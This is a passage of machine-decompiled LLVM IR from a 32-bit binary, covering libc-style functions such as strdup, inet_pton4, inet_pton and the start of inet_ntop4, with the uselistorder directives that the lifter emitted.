  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057008, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8057004, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057010 = load i32, i32* @edi, align 4
  %v0_8057011 = load i32, i32* @esi, align 4
  %v0_8057012 = load i32, i32* @ebx, align 4
  store i32 %v0_8057012, i32* %stack_var_-12, align 4
  %v4_8057013 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057013, i32* @edi, align 4
  %v3_805701b = call i32 @strlen(i8* %arg1)
  %v1_8057020 = add i32 %v3_805701b, 1
  store i32 %v1_8057020, i32* @esi, align 4
  %v2_8057026 = call i32 @malloc(i32 %v1_8057020)
  store i32 %v2_8057026, i32* %ebx.global-to-local, align 4
  %v1_8057030 = icmp eq i32 %v2_8057026, 0
  br i1 %v1_8057030, label %dec_label_pc_8057040, label %dec_label_pc_8057034

dec_label_pc_8057034:                             ; preds = %entry
  %v0_8057035 = load i32, i32* @esi, align 4
  %v0_8057036 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8057026 to i16*
  %v6_8057038 = call i32 @memcpy(i16* %tmp11, i32 %v0_8057036, i32 %v0_8057035)
  %v0_8057040.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057040

dec_label_pc_8057040:                             ; preds = %entry, %dec_label_pc_8057034
  %v0_8057040 = phi i32 [ 0, %entry ], [ %v0_8057040.pre, %dec_label_pc_8057034 ]
  %v2_8057042 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057042, i32* @ebx, align 4
  store i32 %v0_8057011, i32* @esi, align 4
  store i32 %v0_8057010, i32* @edi, align 4
  ret i32 %v0_8057040

; uselistorder directives
  uselistorder i32 %v2_8057026, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 7, 6, 5, 4, 3, 1, 15, 14, 13, 12, 11, 10, 9, 8, 2, 0 }
  uselistorder label %dec_label_pc_8057040, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805704a = load i32, i32* @esi, align 4
  %v0_8057051 = load i32, i32* @eax, align 4
  store i32 %v0_8057051, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8057057 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057057, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805709f15 = inttoptr i32 %v0_8057051 to i8*
  %v2_805709f16 = load i8, i8* %v1_805709f15, align 1
  %v3_805709f17 = sext i8 %v2_805709f16 to i32
  store i32 %v3_805709f17, i32* @ecx, align 4
  %v1_80570a218 = add i32 %v0_8057051, 1
  store i32 %v1_80570a218, i32* %ebx.global-to-local, align 4
  %v1_80570a319 = icmp eq i8 %v2_805709f16, 0
  %v1_80570a520 = icmp eq i1 %v1_80570a319, false
  br i1 %v1_80570a520, label %dec_label_pc_8057062, label %dec_label_pc_80570a7.thread

dec_label_pc_80570a7.thread:                      ; preds = %entry
  br label %dec_label_pc_80570c4

dec_label_pc_8057062:                             ; preds = %entry, %dec_label_pc_805709f.backedge
  %v3_805709f22 = phi i32 [ %v3_805709f, %dec_label_pc_805709f.backedge ], [ %v3_805709f17, %entry ]
  %v2_805709f21 = phi i8 [ %v2_805709f, %dec_label_pc_805709f.backedge ], [ %v2_805709f16, %entry ]
  %v1_8057062 = add nsw i32 %v3_805709f22, -48
  store i32 %v1_8057062, i32* %eax.global-to-local, align 4
  %v6_8057068 = icmp ugt i32 %v1_8057062, 9
  br i1 %v6_8057068, label %dec_label_pc_805708b, label %dec_label_pc_805706a

dec_label_pc_805706a:                             ; preds = %dec_label_pc_8057062
  %v0_805706a = load i32, i32* @esi, align 4
  %v1_805706a = inttoptr i32 %v0_805706a to i8*
  %v2_805706a = load i8, i8* %v1_805706a, align 1
  %v2_805706d = zext i8 %v2_805706a to i32
  %v3_805706d = mul nuw nsw i32 %v2_805706d, 10
  %v3_8057070 = add nsw i32 %v3_805706d, %v1_8057062
  store i32 %v3_8057070, i32* %eax.global-to-local, align 4
  %v6_8057079 = icmp ugt i32 %v3_8057070, 255
  br i1 %v6_8057079, label %dec_label_pc_80570c4, label %dec_label_pc_805707b

dec_label_pc_805707b:                             ; preds = %dec_label_pc_805706a
  %v1_805707b = trunc i32 %v3_8057070 to i8
  store i8 %v1_805707b, i8* %v1_805706a, align 1
  %v0_805707d = load i32, i32* @edx, align 4
  %v1_805707d = icmp eq i32 %v0_805707d, 0
  %v1_805707f = icmp eq i1 %v1_805707d, false
  br i1 %v1_805707f, label %dec_label_pc_805709f.backedge, label %dec_label_pc_8057081

dec_label_pc_8057081:                             ; preds = %dec_label_pc_805707b
  %v0_8057081 = load i32, i32* @edi, align 4
  %v1_8057081 = add i32 %v0_8057081, 1
  store i32 %v1_8057081, i32* @edi, align 4
  %v1_8057082 = add i32 %v0_8057081, -3
  %v6_8057082 = sub i32 2, %v0_8057081
  %v7_8057082 = and i32 %v6_8057082, %v1_8057081
  %v8_8057082 = icmp slt i32 %v7_8057082, 0
  %v9_8057082 = icmp eq i32 %v1_8057082, 0
  %v10_8057082 = icmp slt i32 %v1_8057082, 0
  %v3_8057085 = icmp eq i1 %v10_8057082, %v8_8057082
  %v4_8057085 = icmp eq i1 %v9_8057082, false
  %v5_8057085 = and i1 %v4_8057085, %v3_8057085
  br i1 %v5_8057085, label %dec_label_pc_80570c4, label %dec_label_pc_8057087

dec_label_pc_8057087:                             ; preds = %dec_label_pc_8057081
  %v1_8057087 = and i32 %v0_805707d, -256
  %v2_8057087 = or i32 %v1_8057087, 1
  store i32 %v2_8057087, i32* @edx, align 4
  br label %dec_label_pc_805709f.backedge

dec_label_pc_805708b:                             ; preds = %dec_label_pc_8057062
  %v9_805708b = icmp eq i8 %v2_805709f21, 46
  %v1_805708e = icmp eq i1 %v9_805708b, false
  br i1 %v1_805708e, label %dec_label_pc_80570c4, label %dec_label_pc_8057090

dec_label_pc_8057090:                             ; preds = %dec_label_pc_805708b
  %v0_8057090 = load i32, i32* @edx, align 4
  %v1_8057090 = icmp eq i32 %v0_8057090, 0
  br i1 %v1_8057090, label %dec_label_pc_80570c4, label %dec_label_pc_8057094

dec_label_pc_8057094:                             ; preds = %dec_label_pc_8057090
  %v0_8057094 = load i32, i32* @edi, align 4
  %v9_8057094 = icmp eq i32 %v0_8057094, 4
  br i1 %v9_8057094, label %dec_label_pc_80570c4, label %dec_label_pc_8057099

dec_label_pc_8057099:                             ; preds = %dec_label_pc_8057094
  %v0_8057099 = load i32, i32* @esi, align 4
  %v1_8057099 = add i32 %v0_8057099, 1
  store i32 %v1_8057099, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_805709c = inttoptr i32 %v1_8057099 to i8*
  store i8 0, i8* %v1_805709c, align 1
  br label %dec_label_pc_805709f.backedge

dec_label_pc_805709f.backedge:                    ; preds = %dec_label_pc_8057099, %dec_label_pc_8057087, %dec_label_pc_805707b
  %v0_805709f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805709f = inttoptr i32 %v0_805709f.pre to i8*
  %v2_805709f = load i8, i8* %v1_805709f, align 1
  %v3_805709f = sext i8 %v2_805709f to i32
  store i32 %v3_805709f, i32* @ecx, align 4
  %v1_80570a2 = add i32 %v0_805709f.pre, 1
  store i32 %v1_80570a2, i32* %ebx.global-to-local, align 4
  %v1_80570a3 = icmp eq i8 %v2_805709f, 0
  %v1_80570a5 = icmp eq i1 %v1_80570a3, false
  br i1 %v1_80570a5, label %dec_label_pc_8057062, label %dec_label_pc_80570a7

dec_label_pc_80570a7:                             ; preds = %dec_label_pc_805709f.backedge
  %v0_80570a7.pre = load i32, i32* @edi, align 4
  %v7_80570aa = icmp sgt i32 %v0_80570a7.pre, 3
  br i1 %v7_80570aa, label %dec_label_pc_80570ac, label %dec_label_pc_80570c4

dec_label_pc_80570ac:                             ; preds = %dec_label_pc_80570a7
  %v0_80570ac = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8057057, i32* %eax.global-to-local, align 4
  %v3_80570b5 = bitcast i32* %stack_var_-20 to i16*
  %v4_80570b5 = call i32 @memcpy(i16* %v3_80570b5, i32 4, i32 %v0_80570ac)
  br label %dec_label_pc_80570c6

dec_label_pc_80570c4:                             ; preds = %dec_label_pc_8057094, %dec_label_pc_8057090, %dec_label_pc_805708b, %dec_label_pc_8057081, %dec_label_pc_805706a, %dec_label_pc_80570a7.thread, %dec_label_pc_80570a7
  br label %dec_label_pc_80570c6

dec_label_pc_80570c6:                             ; preds = %dec_label_pc_80570ac, %dec_label_pc_80570c4
  %storemerge = phi i32 [ 0, %dec_label_pc_80570c4 ], [ 1, %dec_label_pc_80570ac ]
  %v0_80570cd = phi i32 [ 0, %dec_label_pc_80570c4 ], [ 1, %dec_label_pc_80570ac ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805704a, i32* @esi, align 4
  ret i32 %v0_80570cd

; uselistorder directives
  uselistorder i32 %v3_805709f, { 1, 0 }
  uselistorder i8 %v2_805709f, { 1, 2, 0 }
  uselistorder i32 %v1_8057082, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_80570c6, { 1, 0 }
  uselistorder label %dec_label_pc_80570c4, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8057062, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80570ce = load i32, i32* @ebp, align 4
  %v0_80570cf = load i32, i32* @edi, align 4
  %v0_80570d0 = load i32, i32* @esi, align 4
  %v0_80570d1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80570d9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80570d9, i32* @edi, align 4
  %v9_80570dd = icmp eq i32 %arg1, 2
  br i1 %v9_80570dd, label %dec_label_pc_80570ed, label %dec_label_pc_80570e2

dec_label_pc_80570e2:                             ; preds = %entry
  %v9_80570e2 = icmp eq i32 %arg1, 10
  %v1_80570e5 = icmp eq i1 %v9_80570e2, false
  br i1 %v1_80570e5, label %dec_label_pc_805727e, label %dec_label_pc_80570fd

dec_label_pc_80570ed:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80570d9, i32* @eax, align 4
  %v3_80570f3 = call i32 @inet_pton4(i32 %v0_80570d1, i32 %v0_80570d0, i32 %v0_80570cf)
  store i32 %v3_80570f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057290

dec_label_pc_80570fd:                             ; preds = %dec_label_pc_80570e2
  %v2_8057102 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8057102, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_8057107 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_8057107, i32* @ebx, align 4
  %v2_805710e = add i32 %v5_8057107, 16
  store i32 %v2_805710e, i32* %eax.global-to-local, align 4
  %v0_8057118 = load i32, i32* @edi, align 4
  %v1_8057118 = inttoptr i32 %v0_8057118 to i8*
  %v2_8057118 = load i8, i8* %v1_8057118, align 1
  %v11_8057118 = icmp eq i8 %v2_8057118, 58
  %v1_805711b = icmp eq i1 %v11_8057118, false
  br i1 %v1_805711b, label %dec_label_pc_80571ae, label %dec_label_pc_805711d

dec_label_pc_805711d:                             ; preds = %dec_label_pc_80570fd
  %v1_805711d = add i32 %v0_8057118, 1
  store i32 %v1_805711d, i32* @edi, align 4
  %v1_805711e = inttoptr i32 %v1_805711d to i8*
  %v2_805711e = load i8, i8* %v1_805711e, align 1
  %v11_805711e = icmp eq i8 %v2_805711e, 58
  %v1_8057121 = icmp eq i1 %v11_805711e, false
  br i1 %v1_8057121, label %dec_label_pc_805728e, label %dec_label_pc_80571ae

dec_label_pc_8057135:                             ; preds = %dec_label_pc_80571ee
  %v4_805713d = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805c954.597, i32 0, i32 0), i32 %v2_80571f5)
  store i32 %v4_805713d, i32* %eax.global-to-local, align 4
  %v0_8057142 = load i32, i32* @edi, align 4
  %v1_8057142 = add i32 %v0_8057142, 1
  store i32 %v1_8057142, i32* @edi, align 4
  %v1_8057146 = icmp eq i32 %v4_805713d, 0
  br i1 %v1_8057146, label %dec_label_pc_8057165, label %dec_label_pc_805714a

dec_label_pc_805714a:                             ; preds = %dec_label_pc_8057135
  %v0_805714a = load i32, i32* @ebp, align 4
  %v2_805714a = mul i32 %v0_805714a, 16
  %v1_805714d = add i32 %v4_805713d, -134596948
  store i32 %v1_805714d, i32* %eax.global-to-local, align 4
  %v2_8057152 = or i32 %v2_805714a, %v1_805714d
  store i32 %v2_8057152, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_8057152, 65536
  br i1 %tmp127, label %dec_label_pc_80571ee.outer, label %dec_label_pc_805728e

dec_label_pc_80571ee.outer:                       ; preds = %dec_label_pc_805714a, %dec_label_pc_80571ae
  %v0_80571f137 = phi i32 [ %v1_8057142, %dec_label_pc_805714a ], [ %stack_var_-36.0.in, %dec_label_pc_80571ae ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805714a ], [ %stack_var_-44.0, %dec_label_pc_80571ae ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805714a ], [ %stack_var_-36.0, %dec_label_pc_80571ae ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805714a ], [ 0, %dec_label_pc_80571ae ]
  %v4_805716a = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805716f = icmp eq i1 %v4_805716a, false
  br label %dec_label_pc_80571ee

dec_label_pc_8057165:                             ; preds = %dec_label_pc_8057135
  %v0_8057165 = load i32, i32* @esi, align 4
  %v9_8057165 = icmp eq i32 %v0_8057165, 58
  %v1_8057168 = icmp eq i1 %v9_8057165, false
  br i1 %v1_8057168, label %dec_label_pc_80571ba, label %dec_label_pc_805716a

dec_label_pc_805716a:                             ; preds = %dec_label_pc_8057165
  br i1 %v1_805716f, label %dec_label_pc_8057186, label %dec_label_pc_8057171

dec_label_pc_8057171:                             ; preds = %dec_label_pc_805716a
  %v5_8057171 = icmp eq i8* %stack_var_-44.1, null
  %v1_8057176 = icmp eq i1 %v5_8057171, false
  br i1 %v1_8057176, label %dec_label_pc_805728e, label %dec_label_pc_805717c

dec_label_pc_805717c:                             ; preds = %dec_label_pc_8057171
  %v0_805717c = load i32, i32* @ebx, align 4
  %v5_805717c = inttoptr i32 %v0_805717c to i8*
  %v5_8057180 = inttoptr i32 %v1_8057142 to i8*
  br label %dec_label_pc_80571ee

dec_label_pc_8057186:                             ; preds = %dec_label_pc_805716a
  %v1_8057186 = inttoptr i32 %v1_8057142 to i8*
  %v2_8057186 = load i8, i8* %v1_8057186, align 1
  %v3_8057186 = icmp eq i8 %v2_8057186, 0
  br i1 %v3_8057186, label %dec_label_pc_805728e, label %dec_label_pc_805718f

dec_label_pc_805718f:                             ; preds = %dec_label_pc_8057186
  %v0_805718f = load i32, i32* @ebx, align 4
  %v1_805718f = add i32 %v0_805718f, 2
  store i32 %v1_805718f, i32* @edx, align 4
  %v6_8057196 = icmp ugt i32 %v1_805718f, %v2_805710e
  br i1 %v6_8057196, label %dec_label_pc_805728e, label %dec_label_pc_805719c

dec_label_pc_805719c:                             ; preds = %dec_label_pc_805718f
  %v0_805719c = load i32, i32* @ebp, align 4
  %v2_805719e = udiv i32 %v0_805719c, 256
  %v4_805719e = trunc i32 %v2_805719e to i8
  %v3_80571a1 = inttoptr i32 %v0_805718f to i8*
  store i8 %v4_805719e, i8* %v3_80571a1, align 1
  %v0_80571a3 = load i32, i32* @ebp, align 4
  store i32 %v0_80571a3, i32* %eax.global-to-local, align 4
  %v1_80571a5 = trunc i32 %v0_80571a3 to i8
  %v2_80571a5 = load i32, i32* @ebx, align 4
  %v3_80571a5 = add i32 %v2_80571a5, 1
  %v4_80571a5 = inttoptr i32 %v3_80571a5 to i8*
  store i8 %v1_80571a5, i8* %v4_80571a5, align 1
  %v0_80571a8 = load i32, i32* @edx, align 4
  store i32 %v0_80571a8, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80571ae

dec_label_pc_80571ae:                             ; preds = %dec_label_pc_80570fd, %dec_label_pc_805711d, %dec_label_pc_805719c
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805719c ], [ %v1_805711d, %dec_label_pc_805711d ], [ %v0_8057118, %dec_label_pc_80570fd ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805719c ], [ null, %dec_label_pc_805711d ], [ null, %dec_label_pc_80570fd ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80571ee.outer

dec_label_pc_80571ba:                             ; preds = %dec_label_pc_8057165
  %v9_80571ba = icmp eq i32 %v0_8057165, 46
  %v1_80571bd = icmp eq i1 %v9_80571ba, false
  br i1 %v1_80571bd, label %dec_label_pc_805728e, label %dec_label_pc_80571c3

dec_label_pc_80571c3:                             ; preds = %dec_label_pc_80571ba
  %v0_80571c3 = load i32, i32* @ebx, align 4
  %v1_80571c3 = add i32 %v0_80571c3, 4
  store i32 %v1_80571c3, i32* @esi, align 4
  %v6_80571ca = icmp ugt i32 %v1_80571c3, %v2_805710e
  br i1 %v6_80571ca, label %dec_label_pc_805728e, label %dec_label_pc_80571d0

dec_label_pc_80571d0:                             ; preds = %dec_label_pc_80571c3
  store i32 %v0_80571c3, i32* @edx, align 4
  %v4_80571d2 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80571d2, i32* @eax, align 4
  %v2_80571d6 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80571d6 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_80571d6, i32 %v2_805710e)
  store i32 %v5_80571d6, i32* %eax.global-to-local, align 4
  %v0_80571db = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_80571d6, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_8057225, label %dec_label_pc_805728e

dec_label_pc_80571ee:                             ; preds = %dec_label_pc_80571ee.outer, %dec_label_pc_805717c
  %v0_80571f1 = phi i32 [ %v1_8057142, %dec_label_pc_805717c ], [ %v0_80571f137, %dec_label_pc_80571ee.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805717c, %dec_label_pc_805717c ], [ %stack_var_-44.1.ph, %dec_label_pc_80571ee.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8057180, %dec_label_pc_805717c ], [ %stack_var_-36.1.ph, %dec_label_pc_80571ee.outer ]
  %v1_80571f1 = inttoptr i32 %v0_80571f1 to i8*
  %v2_80571f1 = load i8, i8* %v1_80571f1, align 1
  %v3_80571f1 = sext i8 %v2_80571f1 to i32
  store i32 %v3_80571f1, i32* %eax.global-to-local, align 4
  %v2_80571f5 = call i32 @__GI_tolower(i32 %v3_80571f1)
  store i32 %v2_80571f5, i32* %eax.global-to-local, align 4
  store i32 %v2_80571f5, i32* @esi, align 4
  %v1_80571ff = icmp eq i32 %v2_80571f5, 0
  %v1_8057201 = icmp eq i1 %v1_80571ff, false
  br i1 %v1_8057201, label %dec_label_pc_8057135, label %dec_label_pc_8057207

dec_label_pc_8057207:                             ; preds = %dec_label_pc_80571ee
  %v0_805725d.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_805716a, label %dec_label_pc_8057225, label %dec_label_pc_805720e

dec_label_pc_805720e:                             ; preds = %dec_label_pc_8057207
  %v1_805720e = add i32 %v0_805725d.pre.pre, 2
  store i32 %v1_805720e, i32* @edx, align 4
  %v6_8057215 = icmp ugt i32 %v1_805720e, %v2_805710e
  br i1 %v6_8057215, label %dec_label_pc_805728e, label %dec_label_pc_8057217

dec_label_pc_8057217:                             ; preds = %dec_label_pc_805720e
  %v0_8057217 = load i32, i32* @ebp, align 4
  %v2_8057219 = udiv i32 %v0_8057217, 256
  %v4_8057219 = trunc i32 %v2_8057219 to i8
  %v3_805721c = inttoptr i32 %v0_805725d.pre.pre to i8*
  store i8 %v4_8057219, i8* %v3_805721c, align 1
  %v0_805721e = load i32, i32* @ebp, align 4
  store i32 %v0_805721e, i32* %eax.global-to-local, align 4
  %v1_8057220 = trunc i32 %v0_805721e to i8
  %v2_8057220 = load i32, i32* @ebx, align 4
  %v3_8057220 = add i32 %v2_8057220, 1
  %v4_8057220 = inttoptr i32 %v3_8057220 to i8*
  store i8 %v1_8057220, i8* %v4_8057220, align 1
  %v0_8057223 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8057225

dec_label_pc_8057225:                             ; preds = %dec_label_pc_8057207, %dec_label_pc_80571d0, %dec_label_pc_8057217
  %v0_805725d.pre = phi i32 [ %v0_80571db, %dec_label_pc_80571d0 ], [ %v0_8057223, %dec_label_pc_8057217 ], [ %v0_805725d.pre.pre, %dec_label_pc_8057207 ]
  %v4_8057225 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057225 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8057225, label %dec_label_pc_805725d, label %dec_label_pc_805722c

dec_label_pc_805722c:                             ; preds = %dec_label_pc_8057225
  store i32 1, i32* @esi, align 4
  %v6_8057233 = sub i32 %v0_805725d.pre, %v4_8057225
  store i32 %v6_8057233, i32* @edi, align 4
  %v16_8057237 = icmp eq i32 %v0_805725d.pre, %v2_805710e
  %v1_805723b = icmp eq i1 %v16_8057237, false
  br i1 %v1_805723b, label %dec_label_pc_8057255.preheader, label %dec_label_pc_805728e

dec_label_pc_8057255.preheader:                   ; preds = %dec_label_pc_805722c
  %v3_805725595 = inttoptr i32 %v6_8057233 to i8*
  %v9_805725798 = icmp slt i8* %v3_805725595, inttoptr (i32 1 to i8*)
  br i1 %v9_805725798, label %dec_label_pc_805725d.thread, label %dec_label_pc_805723f

dec_label_pc_805723f:                             ; preds = %dec_label_pc_8057255.preheader, %dec_label_pc_805723f
  %v0_805724d100 = phi i32 [ %v0_8057255.pre, %dec_label_pc_805723f ], [ 1, %dec_label_pc_8057255.preheader ]
  %v0_805723f99 = phi i32 [ %v1_8057255.pre, %dec_label_pc_805723f ], [ %v6_8057233, %dec_label_pc_8057255.preheader ]
  %v2_8057245 = sub i32 %v0_805723f99, %v0_805724d100
  %v2_8057247 = sub i32 %v2_805710e, %v0_805724d100
  %v6_8057249 = add i32 %v2_8057245, %v4_8057225
  store i32 %v6_8057249, i32* %eax.global-to-local, align 4
  %v1_805724d = add i32 %v0_805724d100, 1
  store i32 %v1_805724d, i32* @esi, align 4
  %v1_805724e = inttoptr i32 %v6_8057249 to i8*
  %v2_805724e = load i8, i8* %v1_805724e, align 1
  %v3_805724e = zext i8 %v2_805724e to i32
  %v4_805724e = load i32, i32* @edx, align 4
  %v5_805724e = and i32 %v4_805724e, -256
  %v6_805724e = or i32 %v5_805724e, %v3_805724e
  store i32 %v6_805724e, i32* @edx, align 4
  %v3_8057250 = inttoptr i32 %v2_8057247 to i8*
  store i8 %v2_805724e, i8* %v3_8057250, align 1
  %v0_8057252 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057252 = inttoptr i32 %v0_8057252 to i8*
  store i8 0, i8* %v1_8057252, align 1
  %v0_8057255.pre = load i32, i32* @esi, align 4
  %v1_8057255.pre = load i32, i32* @edi, align 4
  %v2_8057255 = inttoptr i32 %v0_8057255.pre to i8*
  %v3_8057255 = inttoptr i32 %v1_8057255.pre to i8*
  %v9_8057257 = icmp sgt i8* %v2_8057255, %v3_8057255
  br i1 %v9_8057257, label %dec_label_pc_805725d.thread, label %dec_label_pc_805723f

dec_label_pc_805725d.thread:                      ; preds = %dec_label_pc_805723f, %dec_label_pc_8057255.preheader
  br label %dec_label_pc_8057263

dec_label_pc_805725d:                             ; preds = %dec_label_pc_8057225
  %v16_805725d = icmp eq i32 %v0_805725d.pre, %v2_805710e
  %v1_8057261 = icmp eq i1 %v16_805725d, false
  br i1 %v1_8057261, label %dec_label_pc_805728e, label %dec_label_pc_8057263

dec_label_pc_8057263:                             ; preds = %dec_label_pc_805725d.thread, %dec_label_pc_805725d
  store i32 %v2_8057102, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805726f = call i32 @memcpy(i16* %tmp64, i32 %v2_8057102, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057290

dec_label_pc_805727e:                             ; preds = %dec_label_pc_80570e2
  %v1_805727e = call i32 @__errno_location(i32 %v0_80570d1)
  %v1_8057283 = inttoptr i32 %v1_805727e to i32*
  store i32 97, i32* %v1_8057283, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057290

dec_label_pc_805728e:                             ; preds = %dec_label_pc_805718f, %dec_label_pc_8057186, %dec_label_pc_805714a, %dec_label_pc_8057171, %dec_label_pc_805722c, %dec_label_pc_80571d0, %dec_label_pc_805725d, %dec_label_pc_805720e, %dec_label_pc_80571c3, %dec_label_pc_80571ba, %dec_label_pc_805711d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057290

dec_label_pc_8057290:                             ; preds = %dec_label_pc_805727e, %dec_label_pc_8057263, %dec_label_pc_80570ed, %dec_label_pc_805728e
  %v0_8057297 = phi i32 [ -1, %dec_label_pc_805727e ], [ 1, %dec_label_pc_8057263 ], [ %v3_80570f3, %dec_label_pc_80570ed ], [ 0, %dec_label_pc_805728e ]
  store i32 %v0_80570d1, i32* @ebx, align 4
  store i32 %v0_80570d0, i32* @esi, align 4
  store i32 %v0_80570cf, i32* @edi, align 4
  store i32 %v0_80570ce, i32* @ebp, align 4
  ret i32 %v0_8057297

; uselistorder directives
  uselistorder i32 %v1_8057255.pre, { 1, 0 }
  uselistorder i32 %v0_8057255.pre, { 1, 0 }
  uselistorder i32 %v0_805724d100, { 2, 1, 0 }
  uselistorder i32 %v0_805725d.pre, { 2, 1, 0 }
  uselistorder i32 %v0_805725d.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80571f5, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8057142, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_805710e, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_80570d1, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057290, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805728e, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8057263, { 1, 0 }
  uselistorder label %dec_label_pc_805723f, { 1, 0 }
  uselistorder label %dec_label_pc_8057225, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80571ee, { 1, 0 }
  uselistorder label %dec_label_pc_80571ae, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80571ee.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8057299 = load i32, i32* @edi, align 4
  %v0_805729a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_80572a2 = load i32, i32* @eax, align 4
  %v3_80572a6 = and i32 %v0_80572a2, -65536
  store i32 %v3_80572a6, i32* %stack_var_-33, align 4
  %v2_80572b1 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80572b7 = load i32, i32* @edx, align 4
  %v5_80572b7 = inttoptr i32 %v0_80572b7 to i8*
  store i8* %v5_80572b7, i8** %stack_var_-60, align 4
  %v0_80572bb = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80572c1 = add i32 %v2_80572b1, 4
